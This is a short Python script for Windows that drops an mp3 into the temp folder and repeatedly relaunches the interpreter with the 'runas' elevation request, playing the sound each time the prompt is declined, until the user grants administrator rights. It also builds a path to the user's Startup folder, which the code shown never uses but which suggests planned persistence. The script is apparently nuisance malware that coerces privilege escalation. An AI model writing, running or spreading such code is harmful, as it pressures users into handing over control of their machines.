from sys import exit, executable
from os import startfile, getlogin, getenv
from ctypes import windll

path = getenv('temp') + "\\seal.mp3"
startup_path = str(getenv(
    "SystemDrive") + "\\Users\\" + getlogin() + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\")
def force_admin():
    i = 0
    while windll.shell32.ShellExecuteW(None, "runas", executable, "", None, 1) != 42:
        startfile(path)



with open("seal_bytes.txt", "rb")as f:
    seal_bytes = f.read()

with open(path, "wb+")as f:
    f.write(seal_bytes)


force_admin()
